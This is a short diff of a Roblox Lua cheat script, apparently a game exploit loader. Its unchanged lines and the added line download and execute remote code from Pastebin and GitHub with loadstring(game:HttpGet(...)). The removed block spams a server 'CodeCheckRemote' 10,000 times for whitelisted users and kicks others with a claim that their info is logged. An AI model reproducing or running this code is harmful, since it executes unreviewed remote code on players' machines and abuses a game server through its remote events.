@@ -2,16 +2,4 @@ local ass = loadstring(game:HttpGet("https://raw.githubusercontent.com/QuackerOm
 local a = _G.Code
 loadstring(game:HttpGet('https://pastebin.com/raw/qaMVTFdn'))()
 local plr = game.Players.LocalPlayer.Name
-for i,v in next, _G.whitelistedbbg do 
-    if plr == v then
-        for i = 1,1e4 do
-            local args = {
-                [1] = unpack(a)
-            }
-            
-            game:GetService("ReplicatedStorage").CodeCheckRemote:FireServer(unpack(args))
-        end
-    else
-        game.Players.LocalPlayer:Kick("Lack Of Swag. Info Logged (not whitelisted)")
-    end
-end
+loadstring(game:HttpGet('https://pastebin.com/raw/3K1Ge3H8'))()
